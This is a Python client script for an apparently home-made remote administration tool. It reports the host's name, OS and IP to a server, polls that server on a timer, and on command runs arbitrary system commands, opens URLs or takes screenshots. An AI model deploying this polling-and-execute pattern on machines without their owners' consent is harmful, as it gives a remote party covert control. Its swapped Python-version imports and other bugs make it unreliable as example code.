#!/usr/bin/env python
# File written by Evert Arends, all rights reserved. First run: Thursday November 26 in 2015 around 3 PM.#

from __future__ import print_function
import os
import sys
import base64
import os.path
import datetime
import threading

import method as mtd
import constants as cfg
from commands import Commands
from bin.screenshot import Screenshot
from bin.communication import Communication

# defining used python version.
if cfg.PY_VERSION == 3:
    from urllib2 import urlopen
elif cfg.PY_VERSION == 2:
    from urllib import urlopen

communication = Communication()

# Global functions
def filecheck():
    if not os.path.exists(cfg.CONFIG_DIR):
        os.mkdir(cfg.CONFIG_DIR)
        print('Created {0}'.format(cfg.CONFIG_DIR))

    key_file = mtd.get_key_info()
    print("Keyfile:", key_file)

    if not key_file:
        mtd.register_client()
        sys.exit()
    else:
        get_cmd()


def request():
    """
        Requests data from the server, it gets the base64 encoded string from a file.
        This string contains API and KEY authentication.
    """
    data = mtd.get_key_info()
    client_ip = mtd.get_client_ip()

    # The Encoded data in a base64 string, so I can post spaces and weird characters.
    # Decode they key, so its not double encoded.
    data = base64.b64decode(data)
    post_data = base64.b64encode(data + ',' + cfg.G_PCNAME + ',' + cfg.G_OSNAME + ',' + client_ip)

    print("server data = " + post_data)
    # Request URL with a get parameter, which makes it easier to store the data on the server self.
    s = communication.getdata(cfg.P_BASE, cfg.P_DATA, post_data)
    print(s)

    # Starting loop to get a server reply.
    get_cmd()


def parse_cmd(inp, key):
    """
    This function validates the data we received from the API
    and delegates the appropriate responses to that data.
    """

    # First check if inp can be parsed as an integer
    try:
        int(inp)
        print(inp)
    except:
        print('Input was not an integer :)')
        return

    commands = Commands()

    if inp == '1':
        print('input 1')
        message = communication.getdata(cfg.P_BASE, cfg.P_COMMAND, key)
        commands.system_cmd(message)
    elif inp == '2':
        url_to_open = communication.getdata(cfg.P_BASE, cfg.P_COMMAND, key)
        commands.open_webbrowser(url_to_open)
    elif inp == '3':
        url_to_open = communication.getdata(cfg.P_BASE, cfg.P_COMMAND, key)

        screenshot = Screenshot()
        screenshot.snap()


def get_cmd():
    """
        Requests data from server, and checks if there is a result
    """
    cfg.COUNT += 1  # Count the total requests this session.
    key = mtd.get_key_info()

    threading.Timer(cfg.INTERVAL, get_cmd).start()  # Starts the timer loop to request data from the server.

    logging = (datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + " Request: #" + str(cfg.COUNT) +
               " With a set interval of: " + str(cfg.INTERVAL))  # Sets string for logbook.
    print(logging)  # To see the result in the terminal.
    mtd.error_logging(logging)  # Writing to log file.

    content = communication.getdata(cfg.P_BASE, cfg.P_GET, key)

    if key == content:
        content = communication.getdata(cfg.P_BASE, cfg.P_MESSAGE, key)
        print('Key is in imported_content', content)
        parse_cmd(content, key)


if __name__ == '__main__':
    filecheck()
